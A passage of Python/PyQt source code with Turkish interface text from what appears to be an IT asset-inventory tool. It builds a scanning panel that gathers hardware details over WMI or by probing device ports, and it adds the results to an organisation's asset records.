        filter_frame = QFrame()
        filter_frame.setStyleSheet("QFrame{background:#16213e;border-radius:10px;padding:8px;}")
        filter_layout = QHBoxLayout(filter_frame)
        
        filter_layout.addWidget(QLabel("🔎 Cihaz Türü:"))
        self.device_filter = QComboBox()
        self.device_filter.addItems([
            "📱 Tüm Cihazlar",
            "🖥️ Bilgisayarlar (WMI)",
            "🖨️ Yazıcılar",
            "📹 IP Kameralar",
            "🌐 Ağ Cihazları (Switch/Router)",
            "💾 NAS Cihazları",
            "📡 Tüm HTTP Cihazları"
        ])
        self.device_filter.setStyleSheet("""
            QComboBox{background:#0a0a14;color:#00d4ff;padding:6px 10px;border:1px solid #0f3460;border-radius:4px;min-width:180px;}
            QComboBox::drop-down{border:none;}
            QComboBox QAbstractItemView{background:#16213e;color:white;selection-background-color:#00d4ff;}
        """)
        self.device_filter.setToolTip("Taranacak cihaz türünü seçin")
        filter_layout.addWidget(self.device_filter)
        
        filter_layout.addWidget(QLabel("│"))
        
        # Varlıklara Ekle butonu
        self.add_to_assets_btn = QPushButton("📥 Varlıklara Ekle")
        self.add_to_assets_btn.setStyleSheet("""
            QPushButton{background:#27ae60;color:white;padding:6px 15px;border:none;border-radius:4px;font-weight:bold;}
            QPushButton:hover{background:#2ecc71;}
            QPushButton:disabled{background:#333;color:#666;}
        """)
        self.add_to_assets_btn.setToolTip("Tarama sonuçlarını varlıklara otomatik ekle/güncelle")
        self.add_to_assets_btn.clicked.connect(self.add_results_to_assets)
        self.add_to_assets_btn.setEnabled(False)
        filter_layout.addWidget(self.add_to_assets_btn)
        
        # Seçili cihazı varlıklara ekle
        self.add_selected_btn = QPushButton("➕ Seçiliyi Ekle")
        self.add_selected_btn.setStyleSheet("""
            QPushButton{background:#3498db;color:white;padding:6px 15px;border:none;border-radius:4px;font-weight:bold;}
            QPushButton:hover{background:#2980b9;}
            QPushButton:disabled{background:#333;color:#666;}
        """)
        self.add_selected_btn.setToolTip("Seçili cihazı varlıklara ekle")
        self.add_selected_btn.clicked.connect(self.add_selected_to_assets)
        self.add_selected_btn.setEnabled(False)
        filter_layout.addWidget(self.add_selected_btn)
        
        filter_layout.addStretch()
        
        # Sonuç sayısı
        self.result_count_label = QLabel("📊 0 cihaz bulundu")
        self.result_count_label.setStyleSheet("color:#888;font-size:11px;")
        filter_layout.addWidget(self.result_count_label)
        
        layout.addWidget(filter_frame)
        
        # === İSTATİSTİK KARTLARI ===
        stats_frame = QFrame()
        stats_frame.setStyleSheet("QFrame{background:#0f1a2e;border-radius:8px;padding:5px;}")
        stats_layout = QHBoxLayout(stats_frame)
        stats_layout.setSpacing(10)
        
        # Toplam Hedef
        self.stat_total = self.create_stat_card("📋 Hedef", "0", "#00d4ff")
        stats_layout.addWidget(self.stat_total)
        
        # Online
        self.stat_online = self.create_stat_card("🟢 Online", "0", "#00ff88")
        stats_layout.addWidget(self.stat_online)
        
        # Offline
        self.stat_offline = self.create_stat_card("🔴 Offline", "0", "#e74c3c")
        stats_layout.addWidget(self.stat_offline)
        
        # Başarılı
        self.stat_success = self.create_stat_card("✅ Başarılı", "0", "#2ecc71")
        stats_layout.addWidget(self.stat_success)
        
        # Hatalı
        self.stat_error = self.create_stat_card("❌ Hatalı", "0", "#e67e22")
        stats_layout.addWidget(self.stat_error)
        
        # Şu an taranan
        self.stat_current = self.create_stat_card("🔍 Şu An", "-", "#9b59b6")
        stats_layout.addWidget(self.stat_current)
        
        layout.addWidget(stats_frame)
        
        # === KONTROL BUTONLARI ===
        btn_layout = QHBoxLayout()
        
        self.scan_btn = QPushButton("🔍 BİLGİ TOPLA")
        self.scan_btn.setStyleSheet("""
            QPushButton{background:#00d4ff;color:#0a0a14;padding:12px 30px;border:none;border-radius:8px;font-weight:bold;font-size:14px;}
            QPushButton:hover{background:#00a0cc;}
            QPushButton:disabled{background:#444;color:#888;}
        """)
        self.scan_btn.clicked.connect(self.start_scan)
        btn_layout.addWidget(self.scan_btn)
        
        self.test_btn = QPushButton("🔌 Bağlantı Testi")
        self.test_btn.setStyleSheet("""
            QPushButton{background:#f39c12;color:#0a0a14;padding:12px 20px;border:none;border-radius:8px;font-weight:bold;}
            QPushButton:hover{background:#e67e22;}
        """)
        self.test_btn.clicked.connect(self.test_connection)
        btn_layout.addWidget(self.test_btn)
        
        # Eksik Varlıkları Tara butonu
        self.scan_missing_btn = QPushButton("📋 Eksik Varlıkları Tara")
        self.scan_missing_btn.setStyleSheet("""
            QPushButton{background:#9b59b6;color:white;padding:12px 20px;border:none;border-radius:8px;font-weight:bold;}
            QPushButton:hover{background:#8e44ad;}
        """)
        self.scan_missing_btn.setToolTip("Donanım bilgisi olmayan varlıkların IP'lerini tara")
        self.scan_missing_btn.clicked.connect(self.scan_missing_assets)
        btn_layout.addWidget(self.scan_missing_btn)
        
        self.stop_btn = QPushButton("⏹ Durdur")
        self.stop_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:12px 15px;border:none;border-radius:8px;}")
        self.stop_btn.clicked.connect(self.stop_scan)
        self.stop_btn.setEnabled(False)
        btn_layout.addWidget(self.stop_btn)
        
        self.progress = QProgressBar()
        self.progress.setStyleSheet("""
            QProgressBar{background:#1a1a2e;border:1px solid #00d4ff;border-radius:6px;height:25px;text-align:center;color:white;}
            QProgressBar::chunk{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00d4ff,stop:1 #00ff88);border-radius:5px;}
        """)
        btn_layout.addWidget(self.progress, 1)
        
        self.status_label = QLabel("⏳ Hazır")
        self.status_label.setStyleSheet("color:#888;font-size:11px;min-width:150px;")
        btn_layout.addWidget(self.status_label)
        
        layout.addLayout(btn_layout)
        
        # === ANA İÇERİK ===
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Sol: PC Listesi
        left_panel = QFrame()
        left_panel.setStyleSheet("QFrame{background:#0a0a14;border-radius:8px;}")
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(8, 8, 8, 8)
        
        left_header = QLabel("🖥️ BİLGİSAYARLAR")
        left_header.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:12px;padding:5px;background:#16213e;border-radius:4px;")
        left_layout.addWidget(left_header)
        
        self.pc_list = QListWidget()
        self.pc_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:1px solid #0f3460;border-radius:6px;}
            QListWidget::item{padding:12px;border-bottom:1px solid #16213e;}
            QListWidget::item:selected{background:#16213e;border-left:3px solid #00d4ff;}
        """)
        self.pc_list.itemClicked.connect(self.on_pc_selected)
        self.pc_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.pc_list.customContextMenuRequested.connect(self.show_pc_context_menu)
        self.pc_list.itemDoubleClicked.connect(self.vnc_connect)
        left_layout.addWidget(self.pc_list)
        
        # Uzak Bağlantı Butonları
        remote_layout = QHBoxLayout()
        
        self.vnc_btn = QPushButton("🖥️ VNC Bağlan")
        self.vnc_btn.setStyleSheet("""
            QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #27ae60,stop:1 #2ecc71);
                       color:white;border:none;border-radius:4px;padding:6px 10px;font-weight:bold;font-size:10px;}
            QPushButton:hover{background:#2ecc71;}
            QPushButton:disabled{background:#333;color:#666;}
        """)
        self.vnc_btn.clicked.connect(self.vnc_connect)
        self.vnc_btn.setEnabled(False)
        remote_layout.addWidget(self.vnc_btn)
        
        self.rdp_btn = QPushButton("🖥️ RDP Bağlan")
        self.rdp_btn.setStyleSheet("""
            QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #3498db,stop:1 #2980b9);
                       color:white;border:none;border-radius:4px;padding:6px 10px;font-weight:bold;font-size:10px;}
            QPushButton:hover{background:#2980b9;}
            QPushButton:disabled{background:#333;color:#666;}
        """)
        self.rdp_btn.clicked.connect(self.rdp_connect)
        self.rdp_btn.setEnabled(False)
        remote_layout.addWidget(self.rdp_btn)
        
        left_layout.addLayout(remote_layout)
        
        # İstatistikler
        self.stats_label = QLabel("📊 0 bilgisayar tarandı")
        self.stats_label.setStyleSheet("color:#888;font-size:11px;padding:5px;")
        left_layout.addWidget(self.stats_label)
        
        splitter.addWidget(left_panel)
        
        # Sağ: Detay Paneli
        right_panel = QFrame()
        right_panel.setStyleSheet("QFrame{background:#0a0a14;border-radius:8px;}")
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(8, 8, 8, 8)
        
        # Tab Widget
        self.detail_tabs = QTabWidget()
        self.detail_tabs.setStyleSheet("""
            QTabWidget::pane{border:1px solid #0f3460;border-radius:6px;background:#0a0a14;}
            QTabBar::tab{background:#16213e;color:white;padding:8px 15px;margin-right:2px;border-top-left-radius:6px;border-top-right-radius:6px;}
            QTabBar::tab:selected{background:#0f3460;color:#00d4ff;}
        """)
        
        # Genel Tab
        general_tab = QWidget()
        general_layout = QVBoxLayout(general_tab)
        self.general_text = QTextEdit()
        self.general_text.setReadOnly(True)
        self.general_text.setStyleSheet("QTextEdit{background:#0a0a14;color:#00ff88;border:none;font-family:Consolas;font-size:11px;}")
        general_layout.addWidget(self.general_text)
        self.detail_tabs.addTab(general_tab, "📋 Genel")
        
        # Donanım Tab
        hw_tab = QWidget()
        hw_layout = QVBoxLayout(hw_tab)
        self.hw_text = QTextEdit()
        self.hw_text.setReadOnly(True)
        self.hw_text.setStyleSheet("QTextEdit{background:#0a0a14;color:#00d4ff;border:none;font-family:Consolas;font-size:11px;}")
        hw_layout.addWidget(self.hw_text)
        self.detail_tabs.addTab(hw_tab, "🔧 Donanım")
        
        # Disk Tab
        disk_tab = QWidget()
        disk_layout = QVBoxLayout(disk_tab)
        self.disk_text = QTextEdit()
        self.disk_text.setReadOnly(True)
        self.disk_text.setStyleSheet("QTextEdit{background:#0a0a14;color:#f39c12;border:none;font-family:Consolas;font-size:11px;}")
        disk_layout.addWidget(self.disk_text)
        self.detail_tabs.addTab(disk_tab, "💾 Diskler")
        
        # Ağ Tab
        net_tab = QWidget()
        net_layout = QVBoxLayout(net_tab)
        self.net_text = QTextEdit()
        self.net_text.setReadOnly(True)
        self.net_text.setStyleSheet("QTextEdit{background:#0a0a14;color:#9b59b6;border:none;font-family:Consolas;font-size:11px;}")
        net_layout.addWidget(self.net_text)
        self.detail_tabs.addTab(net_tab, "🌐 Ağ")
        
        right_layout.addWidget(self.detail_tabs)
        
        splitter.addWidget(right_panel)
        splitter.setSizes([280, 720])
        
        layout.addWidget(splitter, 1)
        
        # === ALT BUTONLAR ===
        bottom_layout = QHBoxLayout()
        
        export_btn = QPushButton("📄 Excel Export")
        export_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:10px 20px;border:1px solid #00d4ff;border-radius:6px;}QPushButton:hover{background:#16213e;}")
        export_btn.clicked.connect(self.export_excel)
        bottom_layout.addWidget(export_btn)
        
        html_btn = QPushButton("🌐 HTML Rapor")
        html_btn.setStyleSheet("QPushButton{background:#0f3460;color:white;padding:10px 20px;border:1px solid #00ff88;border-radius:6px;}QPushButton:hover{background:#16213e;}")
        html_btn.clicked.connect(self.export_html)
        bottom_layout.addWidget(html_btn)
        
        # Varlıklara Aktar butonu
        sync_btn = QPushButton("🔄 Varlıklara Aktar")
        sync_btn.setStyleSheet("QPushButton{background:#9b59b6;color:white;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;}QPushButton:hover{background:#8e44ad;}")
        sync_btn.clicked.connect(self.sync_to_assets)
        bottom_layout.addWidget(sync_btn)
        
        bottom_layout.addStretch()
        
        clear_btn = QPushButton("🗑️ Temizle")
        clear_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:6px;}")
        clear_btn.clicked.connect(self.clear_results)
        bottom_layout.addWidget(clear_btn)
        
        layout.addLayout(bottom_layout)
        
        # İstatistik değişkenleri
        self.scan_stats = {
            'total': 0,
            'online': 0,
            'offline': 0,
            'success': 0,
            'error': 0,
            'current': '-'
        }
    
    def create_stat_card(self, title, value, color):
        """İstatistik kartı oluştur"""
        card = QFrame()
        card.setStyleSheet(f"""
            QFrame{{
                background: qlineargradient(x1:0,y1:0,x2:0,y2:1,stop:0 #16213e,stop:1 #0a0a14);
                border: 1px solid {color};
                border-radius: 8px;
                padding: 5px;
                min-width: 80px;
            }}
        """)
        card_layout = QVBoxLayout(card)
        card_layout.setContentsMargins(8, 5, 8, 5)
        card_layout.setSpacing(2)
        
        title_label = QLabel(title)
        title_label.setStyleSheet(f"color: #888; font-size: 10px;")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        card_layout.addWidget(title_label)
        
        value_label = QLabel(value)
        value_label.setStyleSheet(f"color: {color}; font-size: 18px; font-weight: bold;")
        value_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        value_label.setObjectName("value")
        card_layout.addWidget(value_label)
        
        return card
    
    def update_stat_card(self, card, value):
        """İstatistik kartı değerini güncelle"""
        value_label = card.findChild(QLabel, "value")
        if value_label:
            value_label.setText(str(value))
    
    def reset_stats(self):
        """İstatistikleri sıfırla"""
        self.scan_stats = {
            'total': 0,
            'online': 0,
            'offline': 0,
            'success': 0,
            'error': 0,
            'current': '-'
        }
        self.update_stat_card(self.stat_total, "0")
        self.update_stat_card(self.stat_online, "0")
        self.update_stat_card(self.stat_offline, "0")
        self.update_stat_card(self.stat_success, "0")
        self.update_stat_card(self.stat_error, "0")
        self.update_stat_card(self.stat_current, "-")
    
    def update_stats_display(self):
        """İstatistikleri ekranda güncelle"""
        self.update_stat_card(self.stat_total, str(self.scan_stats['total']))
        self.update_stat_card(self.stat_online, str(self.scan_stats['online']))
        self.update_stat_card(self.stat_offline, str(self.scan_stats['offline']))
        self.update_stat_card(self.stat_success, str(self.scan_stats['success']))
        self.update_stat_card(self.stat_error, str(self.scan_stats['error']))
        self.update_stat_card(self.stat_current, self.scan_stats['current'])
    
    def parse_targets(self, target_str):
        """Hedef string'i IP listesine çevir"""
        targets = []
        target_str = target_str.strip()
        
        if not target_str:
            return []
        
        if '-' in target_str and target_str.count('.') == 3:
            # Aralık: 192.168.1.1-50
            parts = target_str.rsplit('.', 1)
            if len(parts) == 2:
                base = parts[0]
                range_part = parts[1]
                if '-' in range_part:
                    start_end = range_part.split('-')
                    if len(start_end) == 2:
                        try:
                            start = int(start_end[0])
                            end = int(start_end[1])
                            for i in range(start, end + 1):
                                targets.append(f"{base}.{i}")
                        except:
                            targets = [target_str]
        elif ',' in target_str:
            targets = [t.strip() for t in target_str.split(',')]
        else:
            targets = [target_str]
        
        return targets[:100]  # Max 100 host
    
    def start_scan(self):
        """Taramayı başlat"""
        targets = self.parse_targets(self.target_input.text())
        username = self.user_input.text().strip()
        password = self.pass_input.text()
        domain = self.domain_input.text().strip()
        
        # Cihaz filtresi
        filter_idx = self.device_filter.currentIndex()
        
        # IP girilmemişse varlıklardan çek
        if not targets:
            targets = self.get_targets_from_assets(filter_idx)
            if not targets:
                QMessageBox.warning(self, "Uyarı", "Hedef IP girilmedi ve varlıklarda IP'li cihaz bulunamadı!")
                return
            # Kullanıcıya bilgi ver
            QMessageBox.information(self, "Bilgi", f"Varlıklardan {len(targets)} IP adresi alındı.")
        
        # WMI gerektiren tarama (Bilgisayarlar)
        if filter_idx in [0, 1]:  # Tüm Cihazlar veya Bilgisayarlar
            if not username:
                QMessageBox.warning(self, "Uyarı", "Kullanıcı adı girilmedi!")
                return
            
            if not password:
                QMessageBox.warning(self, "Uyarı", "Şifre girilmedi!")
                return
            
            self.clear_results()
            self.reset_stats()
            
            self.scan_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.progress.setMaximum(len(targets))
            self.progress.setValue(0)
            
            thread_text = self.thread_combo.currentText()
            max_workers = int(thread_text.split()[0])
            
            self.scan_thread = RemoteWMIThread(targets, username, password, domain, max_workers)
            self.scan_thread.progress_update.connect(self.on_progress)
            self.scan_thread.system_info.connect(self.on_system_info)
            self.scan_thread.error_occurred.connect(self.on_error)
            self.scan_thread.scan_complete.connect(self.on_scan_complete)
            self.scan_thread.stats_update.connect(self.on_stats_update)
            self.scan_thread.start()
        else:
            # HTTP/SNMP tabanlı cihaz taraması (Yazıcı, Kamera, Switch vs.)
            self.scan_devices_http(targets, filter_idx)
    
    def get_targets_from_assets(self, filter_idx):
        """Varlıklardan IP listesi al"""
        targets = []
        try:
            main_window = self.window()
            if hasattr(main_window, 'org'):
                org = main_window.org
                assets = list(org.assets.values())
                
                # Filtreye göre varlık türü seç
                type_map = {
                    0: None,  # Tüm Cihazlar
                    1: 'computer',  # Bilgisayarlar
                    2: 'printer',  # Yazıcılar
                    3: 'ip_camera',  # IP Kameralar
                    4: ['router', 'access_point'],  # Ağ Cihazları
                    5: 'server',  # Sunucular/NAS
                    6: None,  # Tüm HTTP
                }
                
                filter_type = type_map.get(filter_idx)
                
                for asset in assets:
                    if asset.ip_address:
                        if filter_type is None:
                            targets.append(asset.ip_address)
                        elif isinstance(filter_type, list):
                            if asset.asset_type in filter_type:
                                targets.append(asset.ip_address)
                        elif asset.asset_type == filter_type:
                            targets.append(asset.ip_address)
        except Exception as e:
            print(f"Varlıklardan IP alınamadı: {e}")
        
        return targets
    
    def scan_devices_http(self, targets, filter_idx):
        """HTTP/SNMP tabanlı cihaz taraması"""
        self.clear_results()
        self.reset_stats()
        
        self.scan_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress.setMaximum(len(targets))
        self.progress.setValue(0)
        
        # Filter türüne göre port ve kategori belirle
        filter_map = {
            2: ('printer', [80, 443, 9100, 515, 631]),      # Yazıcılar
            3: ('camera', [80, 443, 554, 8080]),            # IP Kameralar
            4: ('network', [80, 443, 22, 23, 161]),         # Ağ Cihazları
            5: ('nas', [80, 443, 5000, 5001]),              # NAS
            6: ('http', [80, 443, 8080, 8443]),             # Tüm HTTP
        }
        
        device_type, ports = filter_map.get(filter_idx, ('http', [80, 443]))
        
        # Thread ile tarama
        self.http_scan_thread = DeviceScanThread(targets, device_type, ports)
        self.http_scan_thread.progress_update.connect(self.on_device_progress)
        self.http_scan_thread.device_found.connect(self.on_device_found)
        self.http_scan_thread.scan_complete.connect(self.on_device_scan_complete)
        self.http_scan_thread.start()
    
    def on_device_progress(self, current, total, ip):
        """Cihaz tarama ilerleme"""
        self.progress.setValue(current)
        self.status_label.setText(f"🔍 Taranan: {ip}")
        self.stat_current.findChild(QLabel, "value").setText(ip[:15])
    
    def on_device_found(self, device_info):
        """Cihaz bulundu"""
        # Sonuçlara ekle
        self.results.append(device_info)
        
        # Listeye ekle
        item = QListWidgetItem()
        ip = device_info.get('ip', '-')
        name = device_info.get('name', device_info.get('title', ip))
        dtype = device_info.get('device_type', 'Bilinmiyor')
        vendor = device_info.get('vendor', '')
        
        # İkon seç
        icon_map = {
            'printer': '🖨️', 'camera': '📹', 'router': '🌐', 'switch': '🔀',
            'nas': '💾', 'firewall': '🔥', 'server': '🖥️', 'computer': '💻'
        }
        icon = icon_map.get(device_info.get('type', ''), '📡')
        
        item.setText(f"{icon} {name}\n     {ip} | {vendor[:20] if vendor else dtype}")
        item.setData(Qt.ItemDataRole.UserRole, ip)
        item.setForeground(QColor("#00ff88"))
        
        self.pc_list.addItem(item)
        
        # İstatistik güncelle
        self.stat_success.findChild(QLabel, "value").setText(str(len(self.results)))
        self.result_count_label.setText(f"📊 {len(self.results)} cihaz bulundu")
    
    def on_device_scan_complete(self):
        """Cihaz taraması tamamlandı"""
        self.scan_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress.setValue(self.progress.maximum())
        self.status_label.setText(f"✅ Tamamlandı: {len(self.results)} cihaz bulundu")
        self.stat_current.findChild(QLabel, "value").setText("-")
        
        # Varlıklara ekleme butonunu aktif et
        if self.results:
            self.add_to_assets_btn.setEnabled(True)
        
        QMessageBox.information(self, "Tarama Tamamlandı", 
            f"✅ {len(self.results)} cihaz bulundu!\n\n"
            f"💡 'Varlıklara Ekle' butonu ile cihazları envantere ekleyebilirsiniz.")
    
    def add_results_to_assets(self):
        """Tüm tarama sonuçlarını varlıklara ekle"""
        if not self.results:
            QMessageBox.warning(self, "Uyarı", "Önce tarama yapın!")
            return
        
        if not self.org:
            QMessageBox.warning(self, "Uyarı", "Varlık yöneticisi bağlantısı yok!")
            return
        
        added = 0
        updated = 0
        
        for result in self.results:
            ip = result.get('ip', '')
            if not ip:
                continue
            
            # IP'ye göre mevcut varlık var mı kontrol et
            existing = None
            for asset in self.org.get_assets():
                if asset.ip_address == ip:
                    existing = asset
                    break
            
            if existing:
                # Varsa güncelle
                self.update_asset_from_result(existing, result)
                updated += 1
            else:
                # Yoksa yeni ekle
                self.create_asset_from_result(result)
                added += 1
        
        self.org.save_assets()
        
        QMessageBox.information(self, "Varlıklara Eklendi", 
            f"✅ İşlem tamamlandı!\n\n"
            f"➕ Yeni eklenen: {added}\n"
            f"🔄 Güncellenen: {updated}\n\n"
            f"💡 Varlıklarım sekmesinden kontrol edebilirsiniz.")
    
    def add_selected_to_assets(self):
        """Seçili cihazı varlıklara ekle"""
        if not hasattr(self, 'selected_ip') or not self.selected_ip:
            selected = self.pc_list.currentItem()
            if not selected:
                QMessageBox.warning(self, "Uyarı", "Önce bir cihaz seçin!")
                return
            self.selected_ip = selected.data(Qt.ItemDataRole.UserRole)
        
        # Seçili cihazın bilgilerini bul
        result = next((r for r in self.results if r.get('ip') == self.selected_ip), None)
        if not result:
            QMessageBox.warning(self, "Uyarı", "Cihaz bilgisi bulunamadı!")
            return
        
        if not self.org:
            QMessageBox.warning(self, "Uyarı", "Varlık yöneticisi bağlantısı yok!")
            return
        
        # Mevcut varlık var mı?
        existing = None
        for asset in self.org.get_assets():
            if asset.ip_address == self.selected_ip:
                existing = asset
                break
        
        if existing:
            reply = QMessageBox.question(self, "Varlık Mevcut", 
                f"Bu IP ({self.selected_ip}) zaten varlıklarda kayıtlı.\n"
                f"Mevcut: {existing.name}\n\n"
                f"Bilgileri güncellemek ister misiniz?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            
            if reply == QMessageBox.StandardButton.Yes:
                self.update_asset_from_result(existing, result)
                self.org.save_assets()
                QMessageBox.information(self, "Güncellendi", f"✅ {existing.name} güncellendi!")
        else:
            self.create_asset_from_result(result)
            self.org.save_assets()
            QMessageBox.information(self, "Eklendi", f"✅ Yeni varlık eklendi!")
    
    def update_asset_from_result(self, asset, result):
        """Varlığı tarama sonuçlarından güncelle"""
        # Bilgisayar ise (WMI sonucu)
        if 'computer' in result:
            asset.manufacturer = result['computer'].get('manufacturer', asset.manufacturer)
            asset.model = result['computer'].get('model', asset.model)
            
            # Donanım bilgisi
            hw_info = {
                'cpu': result.get('cpu', {}),
                'ram': result.get('ram', {}),
                'gpu': result.get('gpu', []),
                'disks': result.get('disks', []),
                'network': result.get('network', []),
                'os': result.get('os', {}),
                'bios': result.get('bios', {})
            }
            asset.hardware_info = hw_info
            
            # Disk bilgilerini ayrıca kaydet (sadece fiziksel diskler)
            physical_disks = [d for d in result.get('disks', []) if d.get('type') != 'Partition']
            
            # Mevcut disk sayısı ile yeni disk sayısını karşılaştır
            # Eğer yeni taramada daha az disk bulunduysa, eski bilgileri koru (WMI hatası olabilir)
            old_disk_count = len(asset.disks) if asset.disks else 0
            new_disk_count = len(physical_disks)
            
            if physical_disks:
                if new_disk_count >= old_disk_count or old_disk_count == 0:
                    # Yeni disk bilgileri daha fazla veya eşit - güncelle
                    asset.disks = physical_disks
                    asset.disk_info = "; ".join([f"{d.get('model', '')} ({d.get('size', '')}) [{d.get('type', '')}]" for d in physical_disks])
                else:
                    # Yeni taramada daha az disk bulundu - mevcut diskleri koru ama yeni bulunanları güncelle
                    # Eşleşen diskleri güncelle (model adına göre)
                    for new_disk in physical_disks:
                        new_model = new_disk.get('model', '').lower()
                        found = False
                        for i, old_disk in enumerate(asset.disks):
                            old_model = old_disk.get('model', '').lower()
                            # Model adı eşleşiyorsa güncelle
                            if new_model and old_model and (new_model in old_model or old_model in new_model):
                                asset.disks[i] = new_disk
                                found = True
                                break
                        # Eşleşme bulunamadıysa ve listede yoksa ekle
                        if not found:
                            # Belki yeni bir disk eklenmiş
                            model_exists = any(new_model in d.get('model', '').lower() for d in asset.disks)
                            if not model_exists and new_model:
                                asset.disks.append(new_disk)
                    
                    # disk_info'yu güncelle
                    asset.disk_info = "; ".join([f"{d.get('model', '')} ({d.get('size', '')}) [{d.get('type', '')}]" for d in asset.disks])
            
            # OS bilgisi
            if result.get('os'):
                asset.os_name = result['os'].get('name', '')
            
            # CPU bilgisi
            if result.get('cpu'):
                asset.cpu_name = result['cpu'].get('name', '')
                asset.cpu_cores = str(result['cpu'].get('cores', ''))
                asset.cpu_threads = str(result['cpu'].get('threads', ''))
            
            # RAM bilgisi
            if result.get('ram'):
                asset.ram_total = result['ram'].get('total', '')
            
            # GPU bilgisi
            if result.get('gpu') and len(result['gpu']) > 0:
                asset.gpu_name = result['gpu'][0].get('name', '')
                asset.gpu_vram = result['gpu'][0].get('vram', '')
            
            # PC bilgisi
            asset.pc_manufacturer = result['computer'].get('manufacturer', '')
            asset.pc_model = result['computer'].get('model', '')
            
            asset.last_hw_scan = datetime.now().strftime("%Y-%m-%d %H:%M")
        else:
            # HTTP cihazı (yazıcı, kamera vs.)
            if result.get('name'):
                asset.name = result['name']
            if result.get('vendor'):
                asset.manufacturer = result['vendor']
            if result.get('model'):
                asset.model = result['model']
            if result.get('firmware'):
                asset.notes = f"Firmware: {result['firmware']}\n{asset.notes or ''}"
            
            asset.last_hw_scan = datetime.now().strftime("%Y-%m-%d %H:%M")
    
    def create_asset_from_result(self, result):
        """Tarama sonucundan yeni varlık oluştur"""
        from datetime import datetime
        
        # Cihaz türünü belirle
        dtype = result.get('type', 'computer')
        type_map = {
            'printer': 'printer', 'camera': 'camera', 'router': 'network',
            'switch': 'network', 'nas': 'storage', 'firewall': 'network',
            'server': 'server', 'computer': 'computer'
        }
        asset_type = type_map.get(dtype, 'computer')
        
        # Disk bilgileri
        disks = []
        disk_info = ''
        os_name = cpu_name = cpu_cores = cpu_threads = ram_total = ''
        gpu_name = gpu_vram = pc_manufacturer = pc_model = ''
        
        # Bilgisayar ise (WMI sonucu)
        if 'computer' in result:
            name = result['computer'].get('name', result.get('ip', 'Unknown'))
            manufacturer = result['computer'].get('manufacturer', '')
            model = result['computer'].get('model', '')
            
            hw_info = {
                'cpu': result.get('cpu', {}),
                'ram': result.get('ram', {}),
                'gpu': result.get('gpu', []),
                'disks': result.get('disks', []),
                'network': result.get('network', []),
                'os': result.get('os', {}),
                'bios': result.get('bios', {})
            }
            
            # Disk bilgileri (sadece fiziksel diskler)
            physical_disks = [d for d in result.get('disks', []) if d.get('type') != 'Partition']
            if physical_disks:
                disks = physical_disks
                disk_info = "; ".join([f"{d.get('model', '')} ({d.get('size', '')}) [{d.get('type', '')}]" for d in physical_disks])
            
            # Donanım alanları
            os_name = result.get('os', {}).get('name', '')
            cpu_name = result.get('cpu', {}).get('name', '')
            cpu_cores = str(result.get('cpu', {}).get('cores', ''))
            cpu_threads = str(result.get('cpu', {}).get('threads', ''))
            ram_total = result.get('ram', {}).get('total', '')
            gpu_name = result['gpu'][0].get('name', '') if result.get('gpu') else ''
            gpu_vram = result['gpu'][0].get('vram', '') if result.get('gpu') else ''
            pc_manufacturer = result['computer'].get('manufacturer', '')
            pc_model = result['computer'].get('model', '')
        else:
            # HTTP cihazı
            name = result.get('name', result.get('title', result.get('ip', 'Unknown')))
            manufacturer = result.get('vendor', '')
            model = result.get('model', '')
            hw_info = {
                'server': result.get('server', ''),
                'firmware': result.get('firmware', ''),
                'title': result.get('title', '')
            }
        
        # Yeni varlık oluştur
        asset = Asset(
            asset_type=asset_type,
            name=name[:50] if name else 'Unknown',
            manufacturer=manufacturer[:50] if manufacturer else '',
            model=model[:50] if model else '',
            serial='',
            ip_address=result.get('ip', ''),
            mac_address=result.get('mac', ''),
            location='',
            department_id=None,
            status='active',
            purchase_date='',
            notes=f"Otomatik eklendi: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
            hardware_info=hw_info,
            last_hw_scan=datetime.now().strftime("%Y-%m-%d %H:%M"),
            disks=disks,
            disk_info=disk_info,
            os_name=os_name,
            cpu_name=cpu_name,
            cpu_cores=cpu_cores,
            cpu_threads=cpu_threads,
            ram_total=ram_total,
            gpu_name=gpu_name,
            gpu_vram=gpu_vram,
            pc_manufacturer=pc_manufacturer,
            pc_model=pc_model
        )
        
        self.org.add_asset(asset)
    
    def on_stats_update(self, stats):
        """İstatistik güncellemesi geldiğinde"""
        self.scan_stats = stats
        self.update_stats_display()
    
    def scan_missing_assets(self):
        """Donanım bilgisi eksik varlıkları tara"""
        if not self.org:
            QMessageBox.warning(self, "Uyarı", "Varlık yöneticisi bağlantısı yok!")
            return
        
        # Donanım bilgisi olmayan ve IP adresi olan varlıkları bul
        all_assets = self.org.get_assets()
        missing_assets = [a for a in all_assets if not a.last_hw_scan and a.ip_address]
        
        if not missing_assets:
            # Belki tüm varlıkların bilgisi var veya IP yok
            no_ip_count = len([a for a in all_assets if not a.ip_address])
            has_hw_count = len([a for a in all_assets if a.last_hw_scan])
            
            msg = "Donanım bilgisi eksik varlık bulunamadı!\n\n"
            msg += f"📊 Toplam varlık: {len(all_assets)}\n"
            msg += f"✅ Donanım bilgisi olan: {has_hw_count}\n"
            msg += f"🚫 IP adresi olmayan: {no_ip_count}"
            
            QMessageBox.information(self, "Bilgi", msg)
            return
        
        # IP listesi
        ip_list = [a.ip_address for a in missing_assets]
        
        # Onay iste
        msg = f"📋 {len(missing_assets)} varlığın donanım bilgisi eksik.\n\n"
        msg += "IP Listesi:\n"
        msg += ", ".join(ip_list[:10])
